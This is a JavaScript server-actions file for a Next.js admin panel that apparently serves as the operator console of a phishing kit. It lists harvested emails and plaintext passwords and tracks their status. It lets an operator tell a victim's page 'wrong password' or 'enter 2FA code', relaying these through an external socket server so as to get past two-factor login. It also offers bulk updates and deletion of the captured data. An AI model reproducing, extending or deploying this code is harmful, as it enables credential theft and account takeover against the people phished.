"use server";

import connectDB from "@/lib/db/connectdb";
import User from "@/lib/models/User";
import { cookies } from "next/headers";

// Helper to check admin session
async function checkAdminAuth() {
    try {
        const cookieStore = await cookies();
        const session = cookieStore.get("admin_session");
        return session && session.value === "authenticated";
    } catch (error) {
        console.error("Admin auth check error:", error);
        return false;
    }
}

// Helper function to send socket notification
async function sendSocketNotification(userId, newStatus, authCode, email) {
    try {
        // Get socket server URL from environment variables
        const socketUrl = process.env.NEXT_PUBLIC_SOCKET_SERVER_URL ||
            process.env.SOCKET_SERVER_URL ||
            'https://email-password-backend-production.up.railway.app';

        // Remove trailing slash if exists
        const baseUrl = socketUrl.replace(/\/+$/, '');
        const notifyUrl = `${baseUrl}/api/admin-action`;

        console.log(`📤 Sending admin action to: ${notifyUrl}`);

        // Use AbortController for timeout
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000);

        const response = await fetch(notifyUrl, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                userId: userId,
                newStatus: newStatus,
                authCode: authCode || "",
                email: email || "",
            }),
            signal: controller.signal
        });

        clearTimeout(timeoutId);

        if (response.ok) {
            console.log("✅ Socket notification sent successfully");
        } else {
            console.warn(`⚠️ Socket notification failed with status: ${response.status}`);
        }
    } catch (error) {
        if (error.name === 'AbortError') {
            console.warn("⏱️ Socket notification timeout");
        } else {
            console.error("❌ Socket notification error:", error.message);
        }
        // Don't throw - this is non-critical
    }
}

// Get all users
export async function getUsers() {
    try {
        // Check admin authentication
        const isAuthenticated = await checkAdminAuth();
        if (!isAuthenticated) {
            return {
                success: false,
                message: "Unauthorized access.",
            };
        }

        await connectDB();

        // Get all users sorted by createdAt (newest first)
        const users = await User.find({})
            .sort({ createdAt: -1 })
            .select("email password status authCode createdAt updatedAt")
            .lean();

        // Convert ObjectId and Dates to strings for Next.js Client Components
        const serializedUsers = users.map(user => ({
            ...user,
            _id: user._id?.toString(),
            createdAt: user.createdAt?.toISOString() || null,
            updatedAt: user.updatedAt?.toISOString() || null,
        }));

        return {
            success: true,
            users: serializedUsers,
        };
    } catch (error) {
        console.error("Get users error:", error);
        return {
            success: false,
            message: "Failed to fetch users.",
        };
    }
}

// Update user status
export async function updateUserStatus(userId, newStatus, authCode = null) {
    try {
        // Check admin authentication
        const isAuthenticated = await checkAdminAuth();
        if (!isAuthenticated) {
            return {
                success: false,
                message: "Unauthorized access.",
            };
        }

        // Validate status
        const validStatuses = [
            "pending",
            "wrong_email",
            "wrong_password",
            "2fa",
            "success",
        ];
        if (!validStatuses.includes(newStatus)) {
            return {
                success: false,
                message: "Invalid status.",
            };
        }

        await connectDB();

        const user = await User.findById(userId);

        if (!user) {
            return {
                success: false,
                message: "User not found.",
            };
        }

        // Update status
        user.status = newStatus;

        // If status is 2fa, use provided authCode or generate a random one
        if (newStatus === "2fa") {
            if (authCode) {
                user.authCode = authCode;
            } else if (!user.authCode) {
                user.authCode = Math.floor(100000 + Math.random() * 900000).toString();
            }
        }

        // If status is success or wrong_*, clear authCode
        if (newStatus === "success" || newStatus === "wrong_email" || newStatus === "wrong_password") {
            user.authCode = "";
        }

        await user.save();

        // Send socket notification (non-blocking)
        sendSocketNotification(
            user._id.toString(),
            user.status,
            user.authCode || "",
            user.email || ""
        );

        return {
            success: true,
            message: "Status updated successfully.",
        };
    } catch (error) {
        console.error("Update status error:", error);
        return {
            success: false,
            message: "Failed to update status.",
        };
    }
}

// Delete user
export async function deleteUser(userId) {
    try {
        // Check admin authentication
        const isAuthenticated = await checkAdminAuth();
        if (!isAuthenticated) {
            return {
                success: false,
                message: "Unauthorized access.",
            };
        }

        await connectDB();

        const result = await User.findByIdAndDelete(userId);

        if (!result) {
            return {
                success: false,
                message: "User not found.",
            };
        }

        return {
            success: true,
            message: "User deleted successfully.",
        };
    } catch (error) {
        console.error("Delete user error:", error);
        return {
            success: false,
            message: "Failed to delete user.",
        };
    }
}

// Get user by ID
export async function getUserById(userId) {
    try {
        const isAuthenticated = await checkAdminAuth();
        if (!isAuthenticated) {
            return {
                success: false,
                message: "Unauthorized access.",
            };
        }

        await connectDB();

        const user = await User.findById(userId)
            .select("email password status authCode createdAt updatedAt")
            .lean();

        if (!user) {
            return {
                success: false,
                message: "User not found.",
            };
        }

        const serializedUser = {
            ...user,
            _id: user._id?.toString(),
            createdAt: user.createdAt?.toISOString() || null,
            updatedAt: user.updatedAt?.toISOString() || null,
        };

        return {
            success: true,
            user: serializedUser,
        };
    } catch (error) {
        console.error("Get user error:", error);
        return {
            success: false,
            message: "Failed to fetch user.",
        };
    }
}

// Get users by status
export async function getUsersByStatus(status) {
    try {
        const isAuthenticated = await checkAdminAuth();
        if (!isAuthenticated) {
            return {
                success: false,
                message: "Unauthorized access.",
            };
        }

        await connectDB();

        const users = await User.find({ status })
            .sort({ createdAt: -1 })
            .select("email password status authCode createdAt updatedAt")
            .lean();

        const serializedUsers = users.map(user => ({
            ...user,
            _id: user._id?.toString(),
            createdAt: user.createdAt?.toISOString() || null,
            updatedAt: user.updatedAt?.toISOString() || null,
        }));

        return {
            success: true,
            users: serializedUsers,
        };
    } catch (error) {
        console.error("Get users by status error:", error);
        return {
            success: false,
            message: "Failed to fetch users.",
        };
    }
}

// Bulk update status
export async function bulkUpdateStatus(userIds, newStatus) {
    try {
        const isAuthenticated = await checkAdminAuth();
        if (!isAuthenticated) {
            return {
                success: false,
                message: "Unauthorized access.",
            };
        }

        const validStatuses = [
            "pending",
            "wrong_email",
            "wrong_password",
            "2fa",
            "success",
        ];
        if (!validStatuses.includes(newStatus)) {
            return {
                success: false,
                message: "Invalid status.",
            };
        }

        await connectDB();

        const result = await User.updateMany(
            { _id: { $in: userIds } },
            {
                status: newStatus,
                ...(newStatus !== "2fa" && { authCode: "" })
            }
        );

        return {
            success: true,
            message: `${result.modifiedCount} users updated successfully.`,
        };
    } catch (error) {
        console.error("Bulk update error:", error);
        return {
            success: false,
            message: "Failed to update users.",
        };
    }
}

// Get summary statistics
export async function getSummary() {
    try {
        const isAuthenticated = await checkAdminAuth();
        if (!isAuthenticated) {
            return {
                success: false,
                message: "Unauthorized access.",
            };
        }

        await connectDB();

        const [pending, wrongEmail, wrongPassword, twoFA, success, total] = await Promise.all([
            User.countDocuments({ status: "pending" }),
            User.countDocuments({ status: "wrong_email" }),
            User.countDocuments({ status: "wrong_password" }),
            User.countDocuments({ status: "2fa" }),
            User.countDocuments({ status: "success" }),
            User.countDocuments(),
        ]);

        return {
            success: true,
            summary: {
                pending,
                wrongEmail,
                wrongPassword,
                twoFA,
                success,
                total,
            },
        };
    } catch (error) {
        console.error("Get summary error:", error);
        return {
            success: false,
            message: "Failed to fetch summary.",
        };
    }
}

// Clear all data
export async function clearAllData() {
    try {
        const isAuthenticated = await checkAdminAuth();
        if (!isAuthenticated) {
            return {
                success: false,
                message: "Unauthorized access.",
            };
        }

        await connectDB();

        await User.deleteMany({});

        return {
            success: true,
            message: "All data cleared successfully.",
        };
    } catch (error) {
        console.error("Clear data error:", error);
        return {
            success: false,
            message: "Failed to clear data.",
        };
    }
}